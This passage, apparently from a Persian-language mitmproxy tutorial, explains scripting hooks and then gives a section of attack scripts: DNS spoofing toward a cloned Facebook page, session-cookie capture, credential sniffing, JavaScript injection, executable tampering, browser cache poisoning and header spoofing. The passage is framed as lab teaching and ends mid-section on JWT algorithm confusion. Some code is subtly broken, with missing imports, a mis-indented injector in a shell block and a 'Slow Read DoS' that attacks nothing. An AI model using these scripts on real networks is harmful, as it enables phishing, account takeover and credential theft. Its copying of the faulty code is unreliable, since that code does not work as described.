- **توضیح:** نقطه مقابل `request` بوده و زمانی فراخوانی می‌شود که پروکسی پاسخ کامل را از سرور دریافت کرده و آماده ارسال آن به کلاینت باشد. این قلاب برای تحلیل و تغییر محتوای پاسخ کاربرد دارد.
    
- **سناریوی استفاده:** در این مثال، تمام پاسخ‌های HTML را رهگیری کرده و یک یک قطعه کد JavaScript را به انتهای تمام صفحات HTML تزریق میکنیم.(سناریوی حمله MITM و JS Injection - XSS)
    
- **مکانیزم عملکرد:** نوع محتوای Response با بررسی `response.headers.get()` انجام میشود(مثلا اگر `text/html` باشد محتوا کد HTML است.) همچنین محتوای پاسخ از طریق `flow.response.text` قابل دسترسی و تغییر است.

- **روش پیاده‌سازی:**
```python
class InjectScript:
    def response(self, flow):
        #بررسی نوع پاسخ - HTML or Not?
        if flow.response and "text/html" in flow.response.headers.get("content-type", ""):
            #اضافه کردن یک اسکریپت سفارشی به انتهای بدنه HTML
            flow.response.text += "<script>alert('Injected by mitmproxy!')</script>"

addons = [InjectScript()]
```
- بنابراین با این روش هر کد جاوا اسکریپت که بخواهیم را میتوانیم به HTTP Response تزریق کنیم.

###### `flow.error` Flow Error Logging
- **توضیح:** این قلاب هنگام بروز هرگونه خطا در پردازش یک جریان (مثلاً خطای DNS، قطعی اتصال و غیره) فراخوانی می‌شود. برای لاگ‌گیری پیشرفته و مدیریت خطاها ضروری است .

- **سناریوی استفاده:** می‌خواهیم تمام خطاهای Flow Error که رخ میدهد را در یک فایل ذخیره کنیم. 

- **مکانیزم عملکرد:** شی `flow.error` حاوی جزئیات خطا است.

- **روش پیاده‌سازی:**
```python
def error(self, flow):
    if flow.error:
        logging.error(f"Error: {flow.error.msg}")
```

- **نکته:** این اسکریپت فقط خطاهایی را ثبت می‌کند که در سطح **Flow Error** اتفاق افتاده‌اند، نه خطاهای HTTP. در واقع خطاهایی مانند DNS Resolution Failure , TCP Connection Refused , TLS Handshake Failure , Network Unreachable را ثبت میکند اما خطایی مانند HTTP 4xx / 5xx را ثبت نمیکند.
###### `flow.response.statu_code` HTTP Error Logger
- **توضیح:** این اسکریپت خطاهای مربوط به یک HTTP Status Code را ثبت میکند. در این مثال تمامی خطاهای Status Code 502 را ثبت میکنیم.

- **سناریوی استفاده:** برای یافتن ارتباط ناموفق بین Reverse Proxy یا Backend Server

- **مکانیزم عملکرد:** با استفاده از `flow.response.status_code` میتوانیم یک Status Code مورد نظر را شناسایی کنیم.

- **روش پیاده‌سازی:**
```python
from mitmproxy import http
import logging

class HTTP502Logger:

    def __init__(self):
        self.logfile = "http_502_errors.txt"

    def response(self, flow: http.HTTPFlow):
        if flow.response and flow.response.status_code == 502:
            with open(self.logfile, "a", encoding="utf-8") as f:
                f.write("=== HTTP 502 Detected ===\n")
                f.write(f"Client: {flow.client_conn.address}\n")
                f.write(f"Server: {flow.server_conn.address}\n")
                f.write(f"Host: {flow.request.host}\n")
                f.write(f"Method: {flow.request.method}\n")
                f.write(f"URL: {flow.request.pretty_url}\n")
                f.write(f"Timestamp: {flow.response.timestamp_start}\n")
                f.write("-" * 50 + "\n")

addons = [
    HTTP502Logger()
]
```

- این اسکریپت دقیقا چه چیزی را در فایل `http_502_errors.txt` ثبت میکند؟
	1. فقط HTTP Status Code 502
	2. آدرس کلاینت
	3. آدرس سرور upstream
	4. متد HTTP
	5. آدرس کامل URL 
	6. زمان پاسخ

- چرا Status Code 502 مهم است؟
	- در سناریو های عملی وقتیکه Status Code 502 مشاهده میشود نشان دهنده بروز یکی از رخدادهای زیر است:
		- Misconfigured Reverse Proxy
		- SSRF exploitation
		- Broken upstream routing
		- API Gateway failures
		- Load balancer misbehavior
	- از دید Red Team این موارد نشان دهنده موارد زیر هستند:
		- قسمت Backend داخلی قابل دسترس نیست.
		- سرویس‌های داخلی exposed شده اند.
		- نشت اطلاعات از gateway رخ داده است.
	- از دید Blue Team این موارد نشان دهنده موارد زیر هستند:
		- تنظیمات اشتباه انجام شده است. Misconfiguration
		- مسیریابی خراب شده است. Broken routing
		- پیش‌نیازهای سرویس ها خطا گرفته اند. Service dependency failure
###### `proxy_auth(self, flow: http.HTTPFlow)` Additional Security Layer for Proxy Authentication
- **توضیح:** این قلاب زمانی فراخوانی می‌شود که یک کلاینت، اطلاعات احراز هویت پروکسی (Proxy-Authorization) را در درخواست خود ارسال کند. این مکانیزم به ما اجازه می‌دهد تا یک لایه احراز هویت سفارشی به پروکسی خود اضافه کنیم.

- **سناریوی استفاده:** می‌خواهیم دسترسی به پروکسی را فقط به کاربرانی بدهیم که یک توکن خاص را در فیلد رمز عبور ارسال می‌کنند، و در غیر این صورت یک خطای 407 (Proxy Authentication Required) بازگردانیم.

- **مکانیزم عملکرد:** این تابع یک شیء `HTTPFlow` دریافت می‌کند. می‌توانیم هدر Proxy-Authorization آن را بررسی کرده و در صورت نامعتبر بودن، با تنظیم `flow.response` یک پاسخ خطا ایجاد کنیم.

- **روش پیاده‌سازی:**
```python
import base64
from mitmproxy import http

class AuthAddon:
    def proxy_auth(self, flow: http.HTTPFlow):
        auth_header = flow.request.headers.get("Proxy-Authorization", "")
        if auth_header != "Basic " + base64.b64encode(b"user:pass").decode():
            flow.response = http.Response.make(407, "Proxy Authentication Required")

addons = [AuthAddon()]
```

###### Combine `flow.response` & `flow.request` - Data Exfiltration
- **توضیح:** در این مثال از هر دو قلاب `flow.response` و `flow.request` برای ثبت و ضبط ترافیک عبوری و نوشتن آن در یک فایل استفاده میکنیم.

- **سناریو استفاده:** در تحلیل بدافزار یا یک برنامه مشکوک، ذخیره تمامی فایل‌های آپلود یا دانلود شده توسط آن برنامه برای تحلیل آفلاین.

- **مکانیزم عملکرد:** آدرس URL درون `flow.request.path_components` قرار میگیرد و داده درون Response نیز در `flow.response.content` قرار میگیرد. بنابراین با نوشتن `flow.response.content` درون یک فایل تمامی داده های عبوری در Response را ذخیره میکنیم.

- **روش پیاده سازی:**
```python
import os
from mitmproxy import http

class FileExtractor:
    def response(self, flow):
        #استخراج نام فایل از آدرس
        url_path = flow.request.path_components
        if not url_path:
            return
        filename = url_path[-1] #آخرین بخش مسیر به عنوان نام فایل
        if filename:
            #ذخیره فایل در دایرکتوری استخراج شده
            save_path = os.path.join("./extracted_files", filename)
            os.makedirs("./extracted_files", exist_ok=True)
            with open(save_path, "wb") as f:
                f.write(flow.response.content)
            logging.info(f"Extracted file: {filename}")

addons = [FileExtractor()]
```

- **نکته:** این اسکریپت، بدنه پاسخ `flow.response.content` را در یک فایل ذخیره می‌کند. برای آپلود فایل‌ها باید از قلاب `request` و `flow.request.multipart_form` استفاده کرد.
##### mitmproxy Scripting (Hooks & API) - Protocol Specific Hooks
در این بخش Hook هایی را توضیح میدهیم که مخصوص پروتکل هایی خاص هستند.
###### `websocket_message(flow)` Change WebSocket Messages
- **توضیح:** هر بار که یک پیام WebSocket بین کلاینت و سرور رد و بدل شود، این قلاب فعال می‌شود. شیء flow شامل لیستی از پیام‌ها `flow.websocket.messages` است و آخرین پیام در انتهای این لیست قرار دارد .

- **سناریوی استفاده:** می‌خواهیم یک پیام WebSocket حاوی عبارت "password" را سانسور کنیم.

- **مکانیزم عملکرد:** می‌توانیم محتوای آخرین پیام را بخوانیم، در صورت لزوم تغییر دهیم یا آن را با استفاده از `()message.drop` بطور کلی حذف کنیم.

- **روش پیاده‌سازی:**
```python
def websocket_message(self, flow):
    last_msg = flow.websocket.messages[-1]
    if "password" in last_msg.text:
        last_msg.text = "***REDACTED***"
```

###### `tcp_message(flow, message)` Check TCP Messages

- **توضیح تئوری:** مشابه `websocket_message` اما برای اتصالات Raw TCP. هر بار که یک قطعه داده TCP رد و بدل شود، این Hook اجرا می‌شود.
    
- **سناریوی استفاده:** می‌خواهیم الگوی خاصی از بایت‌ها را در ترافیک TCP یک پروتکل قدیمی جستجو کنیم.
    
- **مکانیزم عملکرد:** به شیء `message` دسترسی داریم که ویژگی‌های `content` و `from_client` را دارد.
    
- **روش پیاده‌سازی:**
```python
def tcp_message(self, flow, message):
    if b"VULN_COMMAND" in message.content:
        logging.warning("Vulnerable command detected!")
```

###### `tls_clienthello(self, data)` TLS Passthrough
- **توضیح:** این Hook در همان ابتدای فرآیند TLS Handshake، زمانی که پروکسی بسته ClientHello را از کلاینت دریافت می‌کند، فراخوانده می‌شود. این یک نقطه حیاتی برای تصمیم‌گیری در مورد نحوه مدیریت اتصال TLS بر اساس اطلاعاتی مانند نام دامنه (SNI) است .

- **سناریوی استفاده:** می‌خواهیم بر اساس نام دامنه تصمیم بگیریم که یک اتصال TLS را بدون رهگیری عبور دهیم (TLS Passthrough). برای مثال، ترافیک google.com را بدون رمزگشایی عبور می‌دهیم.

- **مکانیزم عملکرد:** شی data شامل اطلاعات client_hello است. با دسترسی به `data.context.server.sni` می‌توانیم نام دامنه درخواستی را به دست آوریم و تصمیم منطقی بگیریم.

- **روش پیاده‌سازی:**
```python
import mitmproxy.proxy.layers.tls as tls_layers

class PassthroughAddon:
    def tls_clienthello(self, data: tls_layers.TlsClienthelloData):
        if "google.com" in data.context.server.sni:
            data.ignore_connection = True

addons = [PassthroughAddon()]
```
###### `tls_start_client(self, data: tls.TlsStartData)` Force to Use Weak Cipher
- **توضیح:** این قلاب درست در لحظه‌ای که پراکسی قصد دارد تا فرآیند TLS Handshake را با یک کلاینت آغاز کند، فراخوانی می‌شود. این نقطه، فرصت نهایی برای تغییر تنظیمات امنیتی اتصال قبل از شروع مذاکرات رمزنگاری است .

- **سناریوی استفاده:** می‌خواهیم تمام اتصالات ورودی از سمت کلاینت‌ها را مجبور به استفاده از یک رمزنگاری ضعیف (مثلاً RC4) کنیم تا ترافیک رمزگشایی‌شده آن‌ها را برای اهداف آموزشی تحلیل نماییم.

- **مکانیزم عملکرد:** شیء data شامل یک شیء `tls_start` است که تنظیمات اتصال TLS را مدیریت می‌کند. با دسترسی به `data.conn` می‌توانیم پارامترهای سوکت امنیتی را تغییر دهیم.

- **روش پیاده‌سازی:**
```python
from mitmproxy.proxy.layers import tls

class WeakCipherAddon:
    def tls_start_client(self, data: tls.TlsStartData):
        #مجبور کردن اتصال به استفاده از رمز ضعیف
        data.conn.ciphers = "RC4-SHA"
        
addons = [WeakCipherAddon()]
```
###### `tls_start_server(self, data: tls.TlsStartData)` Disable TLS Verify
- **توضیح:** این قلاب مشابه `tls_start_client` است، اما برای زمانی که پروکسی می‌خواهد یک اتصال TLS را به سمت سرور مقصد آغاز کند. این نقطه، برای کنترل نحوه اتصال پروکسی به سرورهای بالادستی استفاده می‌شود .

- **سناریوی استفاده:** می‌خواهیم اتصال به یک سرور خاص که گواهی منقضی‌شده دارد را با این وجود برقرار کنیم تا فرآیند تست یک API قدیمی مختل نشود.

- **مکانیزم عملکرد:** مشابه قلاب کلاینت است، با این تفاوت که `data.conn` مربوط به ارتباط سمت سرور است. اینجا می‌توانیم تأیید گواهی را غیرفعال کنیم.

- **روش پیاده‌سازی:**
```python
def tls_start_server(self, data: tls.TlsStartData):
    if data.conn.server_address[0] == "old-api.example.com":
        data.conn.verify = False  #فقط در محیط آزمایشگاهی!
```
##### mitmproxy Scripting (Hooks & API) - Hooks Testing
برای اطمینان از صحت و پایداری عملکرد اسکریپت‌های پیچیده، استفاده از تست‌های واحد (Unit Tests) یک الزام است. mitmproxy با ارائه ماژول `mitmproxy.test`، ابزارهای لازم برای شبیه‌سازی محیط اجرا و جریان‌های ترافیکی را در اختیار ما می‌گذارد. این قابلیت به ما امکان می‌دهد اسکریپت‌های خود را به صورت خودکار و بدون نیاز به راه‌اندازی پروکسی اصلی تست کنیم.

**الف) روش تست با `taddons.context()` و `tflow.tflow()`**  
دو جزء اصلی برای تست اسکریپت‌ها عبارتند از:
1. **`taddons.context()`**:
	یک Context Manager است که محیطی شبیه‌سازی‌شده از mitmproxy، شامل موتور Options و Master را برای ما فراهم می‌کند. این کار باعث می‌شود اسکریپت ما فکر کند در یک محیط واقعی در حال اجراست.
    
2. **`tflow.tflow()`**: 
	تابعی کمکی برای ساخت سریع اشیاء `HTTPFlow` جعلی است. می‌توانیم با استفاده از آن، یک درخواست و پاسخ دلخواه ایجاد کرده و رفتار اسکریپت خود را بر روی آن‌ها بررسی کنیم.

**ب) یک مثال جامع از تست واحد**  
فرض کنیم اسکریپتی داریم که یک هدر امنیتی `X-Content-Type-Options: nosniff` را به تمام پاسخ‌ها اضافه می‌کند. می‌خواهیم برای این افزونه تست بنویسیم.

**1: ساختار اسکریپت افزونه (`security_header_addon.py`):**
```python
class AddSecurityHeaders:
    def response(self, flow):
        flow.response.headers["X-Content-Type-Options"] = "nosniff"

addons = [AddSecurityHeaders()]
```

**2: نوشتن فایل تست (`test_security_header_addon.py`):**
```python
from mitmproxy.test import taddons  #برای شبیه‌سازی محیط
from mitmproxy.test import tflow    #برای ساخت جریان‌های تست
from mitmproxy.test import tctx     #برای تست چرخه کامل
import mitmproxy.http
import security_header_addon

def test_security_header_added():
    """
    تست می‌کند که افزونه ما هدر امنیتی را به یک پاسخ اضافه کند.
    """
    #1: ایجاد نمونه از افزونه
    addon = security_header_addon.AddSecurityHeaders()
    
    #2: شبیه‌سازی محیط اجرای mitmproxy با taddons.context
    with taddons.context() as tctx:
        #3: ساخت یک جریان ترافیکی جعلی (یک پاسخ ساده)
        #resp=True باعث می‌شود جریان یک پاسخ پیش‌فرض داشته باشد
        f = tflow.tflow(resp=True)
        
        #4: ذخیره وضعیت قبل از اجرای افزونه
        original_header_value = f.response.headers.get("X-Content-Type-Options", None)
        
        #5: اجرای دستی قلاب پاسخ افزونه بر روی جریان تست
        addon.response(f)
        
        #6: assert: بررسی میکند که هدر اضافه شده باشد
        assert "X-Content-Type-Options" in f.response.headers
        assert f.response.headers["X-Content-Type-Options"] == "nosniff"
        #همچنین می‌توانیم بررسی کنیم قبلاً وجود نداشته
        assert original_header_value is None
```

**ج) اجرای تست**  
پس از قرار دادن فایل تست در کنار اسکریپت، می‌توانیم آن را با فریم‌ورک‌های تست استاندارد پایتون مانند `pytest` اجرا کنیم:
```sh
pytest test_security_header_addon.py
```
این روش تضمین می‌کند که با هر تغییر در اسکریپت، عملکرد اصلی آن دچار اختلال نشده و سناریوهای مختلف به درستی پوشش داده می‌شوند.
##### Implement Common Attack using mitmproxy
ابزار mitmproxy یک پروکسی برای رهگیری و تغییر است و این قابلیت، آن را به بستری ایده‌آل برای شبیه‌سازی طیف وسیعی از حملات مبتنی بر دستکاری ترافیک، به ویژه در لایه کاربرد (HTTP/HTTPS)، تبدیل می‌کند. در ادامه، مهم‌ترین این حملات را با جزئیات کامل بررسی می‌کنیم.
برای استفاده از اسکریپت های زیر نیز کافیست از فلگ `s-` و یا `script--` در زمان اجرای mitmproxy استفاده کنیم.
```sh
mitmproxy -s script.py
```
###### Attack 1: DNS Spoofing
- **تئوری حمله:** در این سناریو، هدف ما این است که به درخواست‌های DNS دستگاه‌های موجود در شبکه محلی، پاسخ‌های جعلی بدهیم تا آن‌ها را به جای سرور اصلی، به سمت یک سرور تحت کنترل خود هدایت کنیم. این کار معمولاً نیازمند ابزاری مانند Ettercap یا Bettercap برای حمله ARP Spoofing و سپس استفاده از قابلیت `dns-spoof--` در Bettercap یا یک اسکریپت سفارشی در mitmproxy است. خود mitmproxy به تنهایی یک سرور DNS نیست، اما می‌تواند به یک سرور DNS جعلی بالادستی متصل شود یا با استفاده از `mode dns--` درخواست‌های DNS را پردازش و جعل کند .

- **سناریوی استفاده:** در یک شبکه LAN آزمایشگاهی، می‌خواهیم یک حمله فیشینگ آموزشی انجام دهیم و کاربران را وقتی که آدرس `facebook.com` را وارد می‌کنند، به یک صفحه کپی شده از فیسبوک که روی سرور خودمان میزبانی می‌شود، هدایت کنیم.

- **مکانیزم عملکرد:** mitmproxy را در مد `dns` اجرا می‌کنیم و یک اسکریپت برای رهگیری درخواست‌های DNS با قلاب `dns_request` می‌نویسیم. در این قلاب، اگر دامنه مورد نظر ما پرسیده شد، به جای ارسال آن به سرور DNS واقعی، یک پاسخ جعلی با IP سرور خودمان تولید می‌کنیم.

- **اسکریپت `dns_spoof.py`:**
```python
from mitmproxy import dns

class DNSSpoofer:
    def dns_request(self, flow: dns.DNSFlow):
        #بررسی اینکه آیا درخواست برای دامنه هدف است
        if flow.request.question and flow.request.question.name == "facebook.com":
            logging.info(f"Intercepted DNS request for facebook.com! Spoofing...")
            #تولید یک پاسخ جعلی با آیپی سرور تحت کنترل ما
            flow.response = flow.request.succeed(["192.168.1.100"])

addons = [DNSSpoofer()]
```

- **روش پیاده‌سازی و اجرا:**
```sh
#Run mitmproxy on DNS Mode
mitmproxy --mode dns -s dns_spoof.py
```

- **نکات:**
	- برای اینکه این حمله در کل شبکه محلی مؤثر باشد، باید ترافیک DNS سایر دستگاه‌ها را نیز از طریق ARP Spoofing به سمت دستگاه مهاجم هدایت کنیم.
	- در محیط واقعی مقادیر facebook.com و 192.168.1.100 با آدرس هایی معتبر که مدنظر است تغییر میکنند.
###### Attack 2: Session Hijacking & Cookie Stealing
- **تئوری حمله:** در این حمله، هدف ما برداشت شناسه نشست (Session ID) کاربر است که معمولاً در کوکی‌ها ذخیره می‌شود. بسیاری از وب‌سایت‌ها پس از احراز هویت، یک کوکی نشست برای کاربر صادر می‌کنند. اگر مهاجم به این کوکی دست یابد، می‌تواند بدون نیاز به نام کاربری و رمز عبور، هویت قربانی را جعل کرده و به حساب کاربری او دسترسی پیدا کند.

- **سناریوی استفاده:** فرض می‌کنیم یک کاربر در یک شبکه محلی آزمایشگاهی به یک برنامه تحت وب آسیب‌پذیر متصل است و ما به عنوان مهاجم، ترافیک او را از طریق ARP Spoofing به سمت mitmproxy هدایت کرده‌ایم. اکنون می‌خواهیم کوکی نشست او را به محض ورود به سیستم، بدست آوریم.

- **مکانیزم عملکرد:** mitmproxy تمام ترافیک HTTP را می‌بیند. ما یک اسکریپت می‌نویسیم که با فعال‌شدن Hook بنام `response`، هدر `Set-Cookie` یا هدر `Cookie` در `flow.request` را برای یافتن کوکی‌های مربوط به دامنه هدف بررسی کند.

- **روش پیاده‌سازی:**
	- فرض بر این است که دامنه هدف "target-app.local" میباشد.
```python
import logging
from mitmproxy import http

class CookieStealer:
    def response(self, flow: http.HTTPFlow):
        if "target-app.local" in flow.request.pretty_host:
            cookies = flow.response.headers.get_all("Set-Cookie")
            if cookies:
                for cookie in cookies:
                    if "sessionid" in cookie.lower():
                        logging.info(f"[!] Session Cookie Captured: {cookie}")

addons = [CookieStealer()]
```
###### Attack 3: Eavesdropping & Credential Sniffing
- **تئوری حمله:** این حمله، ساده‌ترین اما همچنان خطرناک‌ترین کاربرد یک پراکسی رهگیر مانند mitmproxy است. هدف ما مشاهده و ثبت محتوای درخواست‌های HTTP ساده (غیر رمزنگاری‌شده) برای یافتن اطلاعات ورود، شماره کارت‌های اعتباری، یا سایر داده‌های حساس است .

- **سناریوی استفاده:** بسیاری از دستگاه‌های IoT قدیمی یا برنامه‌های داخلی سازمانی همچنان از HTTP ساده استفاده می‌کنند. ما می‌خواهیم ترافیک یک دوربین مداربسته تحت شبکه را برای یافتن رمز عبور آن شنود کنیم. این اسکریپت برای شنود سایر داده ها پروتکل HTTP  نیز استفاده میشود.

- **مکانیزم عملکرد:** mitmproxy در حالت پروکسی شفاف (Transparent)  قرار داده می‌شود. سپس یک اسکریپت ساده، بدنه درخواست‌های POST که معمولاً حاوی اطلاعات فرم هستند را اسکن می‌کند.

- **روش پیاده‌سازی:**
```python
import logging
from mitmproxy import ctx

class CredentialSniffer:
    def request(self, flow):
        if flow.request.method == "POST":
            #الگویی ساده برای جستجوی فیلدهای کاربری و رمز عبور
            username = flow.request.urlencoded_form.get("username")
            password = flow.request.urlencoded_form.get("password")
            if username and password:
                logging.info(f"[!] Credentials Captured! URL: {flow.request.pretty_url}")
                logging.info(f"Username: {username}, Password: {password}")

addons = [CredentialSniffer()]
```

###### Attack 4: Cross-Site Scripting Injection(XSS Attacks)
نمونه ای از این حمله را در فصل Hooks ها بررسی کردیم، در اینجا حمله را با توضیحات بیشتری پیاده سازی میکنیم.
- **تئوری حمله:** این یک حمله پیشرفته مرد میانی (MITM) است که در آن ما محتوای صفحات وب را در لحظه و پیش از رسیدن به مرورگر قربانی تغییر می‌دهیم. با تزریق کدهای مخرب جاوااسکریپت، می‌توانیم کلیدهای فشرده شده توسط کاربر را ضبط کرده، اطلاعات او را به سرور دیگری ارسال کنیم، یا حتی کنترل کامل مرورگر را در دست بگیریم .

- **سناریوی استفاده:** می‌خواهیم صفحه اصلی یک سایت آموزشی ایزوله را دستکاری کنیم تا یک پنجره هشدار نمایش دهد و نشان دهیم که ترافیک قابل دستکاری است.

- **مکانیزم عملکرد:** ما قلاب response را هدف قرار می‌دهیم. محتوای `flow.response.text` را بررسی می‌کنیم و اگر Content-Type از نوع HTML بود، کد جاوااسکریپت خود را قبل از تگ `</body>` به بدنه پاسخ تزریق می‌کنیم.

- **روش پیاده‌سازی:**
```python
class InjectXSS:
    def response(self, flow):
        if "text/html" in flow.response.headers.get("Content-Type", ""):
            payload = "<script>alert('Traffic Manipulated!')</script>"
            flow.response.text = flow.response.text.replace("</body>", f"{payload}</body>")

addons = [InjectXSS()]
```

###### Attack 5: Malware Injector to Backdooring Executables
**اخطار:** این اسکریپت یک حمله قدرتمند مرد میانی (MITM) را برای **اهداف صرفاً آموزشی و در محیط‌های کاملاً ایزوله** پیاده‌سازی می‌کند. 
- **تئوری حمله:** در این حمله ما در ترافیک شبکه به دنبال دانلود فایل‌های اجرایی (مانند فایل‌های `exe.` یا `apk.`) می‌گردیم و در لحظه، یک درپشتی (Backdoor) به آن‌ها تزریق می‌کنیم. کاربر فایل آلوده شده را دانلود و اجرا کرده و ما به سیستم او دسترسی پیدا می‌کنیم.

- **سناریوی استفاده:** در یک آزمایشگاه امنیت سایبری، می‌خواهیم نشان دهیم که چگونه یک ابزار قانونی و سالم چگونه می‌تواند در حین دانلود به یک بدافزار تبدیل شود.

- **مکانیزم عملکرد:** اسکریپت ما پاسخ‌های با پسوند `exe.` را رهگیری می‌کند. محتوای باینری فایل را خوانده، یک payload ساده به انتهای آن اضافه کرده و طول محتوا را در هدر پاسخ تصحیح می‌کند. این Payload میتواند حاوی انواع Shell Code، C++ Codes, ... باشد.
 
- **روش پیاده‌سازی:**
```sh
class MalwareInjector:
    def response(self, flow):
        #تزریق بار مخرب به فایل اجرایی ویندوز EXE
        if flow.response and flow.request.path.endswith(".exe"):
            logging.info(f"Intercepted executable: {flow.request.url}")
    
    #در یک سناریوی واقعی‌تر، کد اسمبلی بی‌ضرری به انتهای فایل اضافه می‌کنیم.
    #اینجا صرفاً یک رشته متنی به انتهای فایل اضافه می‌شود تا مفهوم تزریق نشان داده شود.
            extra_code = b"\x90\x90\x90" #NOP Code in x86 Assembly
            flow.response.content += extra_code
            #Update Header with New Content-Length
            flow.response.headers["Content-Length"] = str(len(flow.response.content))

addons = [MalwareInjector()]
```

###### Attack 6: URL Redirection
- **تئوری حمله:** در این حمله کلاینت را به یک مسیر دلخواه که میتواند سرور تحت کنترل خودمان باشد هدایت میکنیم.

- **سناریو استفاده:** هدایت ترافیک مقصد مخرب به لوکال هاست برای دفع حمله. در این مثال اگر مقصد سرور مخرب malware-c2.example.com بود، مقصد بسته را به localhost تغییر میدهیم.

- **مکانیزم عملکرد:** `request.pretty_host` مسیر مقصد HTTP Request را در خود ذخیره میکند. بنابراین با بررسی این مقدار و تغییر آن، میتوانیم مسیر یک کلاینت را از سرور اصلی به یک سرور دلخواه و تحت کنترل (مثلا  سرور C2) تغییر دهیم. 

- **روش پیاده سازی:**
```python
class TrafficRedirector:
    def request(self, flow):
	#اگر مقصد، سرور مخرب هدف باشد، آن را به سمت لوکال هاست تغییر می‌دهیم
        if "malware-c2.example.com" in flow.request.pretty_host:
            #تغییر آدرس سرور به لوکال هاست
            flow.request.host = "localhost"
            flow.request.port = 9999
            logging.info(f"Redirected request to localhost")

addons = [TrafficRedirector()]
```

- **نکته:** در این مثال `flow.request.host` و `flow.request.port` را تغییر دادیم که به ترتیب برای تغییر دامنه/آیپی و پورت درخواست در سطح TCP استفاده می‌شوند.


###### Attack 7: Geo-Block Bypassing
- **تئوری حمله:** بسیاری از سرویس‌های آنلاین، دسترسی کاربران را بر اساس موقعیت جغرافیایی IP آن‌ها محدود می‌کنند. این کار معمولاً با بررسی آدرس IP مبدأ انجام می‌شود. ما می‌توانیم با تزریق هدرهای خاصی که توسط پراکسی‌های میانی یا CDNها اضافه می‌شوند، سرور مبدأ را فریب دهیم تا تصور کند درخواست از یک کشور مجاز ارسال شده است .
  
- **سناریوی استفاده:** فرض کنیم یک سایت خبری بین‌المللی، محتوای خود را فقط برای IP های داخل اتحادیه اروپا نمایش می‌دهد و ما می‌خواهیم این محدودیت را برای مطالعه و تحلیل محتوای آن در محیط آزمایشگاهی دور بزنیم.

- **مکانیزم عملکرد:** ما اسکریپتی می‌نویسیم که هدرهای استاندارد `X-Forwarded-For` یا هدرهای اختصاصی CDNها مانند `CloudFront-Viewer-Country` را به درخواست‌ها اضافه یا دستکاری کند . توجه داشته باشیم که موفقیت این روش کاملاً به نحوه پیاده‌سازی منطق قفل جغرافیایی در سرور مقصد بستگی دارد.

- **روش پیاده‌سازی:**
```python
class GeoBypassAddon:
    def request(self, flow):
        #جعل آدرس آیپی مبدا به یک آیپی در فرانسه
        flow.request.headers["X-Forwarded-For"] = "5.42.199.255"
        #جعل کشور بیننده برای CDN Cloudflare
        flow.request.headers["CF-IPCountry"] = "FR"
        logging.info(f"Spoofed geo-location headers for: {flow.request.pretty_url}")

addons = [GeoBypassAddon()]
```
###### Attack 8: Browser Cache Poisoning
- **تئوری حمله:** این یک حمله ماندگار مرد میانی است. هدف ما این است که نسخه آلوده‌شده یک فایل استاتیک (مانند یک اسکریپت جاوااسکریپت با پسوند `js.`) را برای مدت طولانی در حافظه کش مرورگر قربانی ذخیره کنیم. به این ترتیب، حتی پس از قطع شدن حمله MITM و اتصال مستقیم قربانی به اینترنت، مرورگر همچنان از نسخه مخرب ذخیره‌شده در کش خود استفاده می‌کند .

- **سناریوی استفاده:** می‌خواهیم یک آسیب‌پذیری XSS را به صورت دائمی در یک سایت خاص که از CDN استفاده می‌کند، تزریق کنیم. با تنظیم هدر کش برای یک سال، مرورگر تا مدت‌ها نسخه مخرب را با نسخه سالم جایگزین نخواهد کرد.
   
- **مکانیزم عملکرد:** ما یک اسکریپت می‌نویسیم که قلاب `response` را رهگیری کند. اگر مسیر درخواست با `jquery.min.js` مطابقت داشت، محتوای آن را با نسخه دستکاری‌شده خود جایگزین کرده و سپس هدرهای `Cache-Control` را برای یک دوره بسیار طولانی (مثلاً یک سال) تنظیم می‌کنیم.
    
- **روش پیاده‌سازی:**
```python
class CachePoisoner:
    def response(self, flow):
        if flow.request.path.endswith("jquery.min.js"):
            logging.info("Poisoning jquery.js in browser cache")
            #جایگزینی محتوای فایل با نسخه دستکاری‌شده
            flow.response.text = "/* malicious code */ console.log('Cache Poisoned!');"
            #تنظیم هدرهای کش برای ذخیره طولانی‌مدت (مثلاً یک سال)
            flow.response.headers["Cache-Control"] = "public, max-age=31536000"

addons = [CachePoisoner()]
```
###### Attack 9: Slow Read DoS
- **تئوری حمله:** این حمله از نوع حملات انکار سرویس (DoS) در لایه Application است. هدف ما اشغال کردن منابع سرور مقصد با کند خواندن پاسخ‌های HTTP است. ما به سرور می‌گوییم که یک فایل حجیم را برای ما بفرستد، اما داده‌ها را بسیار آهسته و قطره‌چکانی از سرور می‌خوانیم. این کار باعث می‌شود اتصالات زیادی روی سرور باز مانده و منابع آن تحلیل برود .
  
- **سناریوی استفاده:** تست مقاومت یک سرور وب در برابر حملات Slow Read در یک محیط آزمایشگاهی. می‌خواهیم ببینیم آیا سرور می‌تواند تعداد زیادی اتصال آهسته را مدیریت کند یا خیر.

- **مکانیزم عملکرد:** ما یک اسکریپت برای mitmproxy می‌نویسیم که به ازای هر درخواستی که به یک مسیر خاص (مثلاً دانلود یک فایل) می‌رود، یک پراکسی بالادستی (upstream proxy) جعلی ایجاد کند که داده‌ها را بسیار آهسته تحویل می‌دهد. این کار با ارسال یک پاسخ HTTP معتبر اما با بدنه‌ای که بایت به بایت و با تأخیر زیاد ارسال می‌شود، انجام می‌شود.

- **روش پیاده‌سازی:**
```python
import time
from mitmproxy import http, ctx

class SlowReadDoS:
    def request(self, flow: http.HTTPFlow):
        #هدف قرار دادن یک مسیر خاص
        if flow.request.path == "/large-file.zip":
            logging.info("Initiating Slow Read DoS attack simulation")
            #ساخت یک پاسخ مصنوعی با بدنه حجیم که آهسته ارسال می‌شود
            def slow_response():
                yield b"HTTP/1.1 200 OK\r\n"
                yield b"Content-Type: application/octet-stream\r\n"
                yield b"\r\n"
                for _ in range(1024): #1KB chunks
                    yield b"A" * 1024
                    time.sleep(0.5) #تأخیر 0.5 ثانیه‌ای در ارسال هر کیلوبایت
            flow.response = http.Response.make(200, slow_response(), {"Content-Type": "application/octet-stream"})

addons = [SlowReadDoS()]
```

###### Attack 10: JWT(JSON Web Tokens) Algorithm Confusion
- **تئوری حمله:** JSON Web Tokens یا JWT ها، یکی از رایج‌ترین روش‌های احراز هویت مدرن هستند. یک آسیب‌پذیری طراحی در برخی کتابخانه‌ها وجود دارد که به ما اجازه می‌دهد الگوریتم امضا را از RS256 (نامتقارن) به HS256 (متقارن) تغییر دهیم. در این صورت، سرور به جای کلید عمومی، از همان کلید عمومی به عنوان کلید متقارن برای تأیید امضا استفاده می‌کند. از آنجایی که کلید عمومی معمولاً قابل دسترس است (مثلاً از طریق یک jwks.json )، ما می‌توانیم توکن‌های جعلی با هر محتوایی بسازیم.

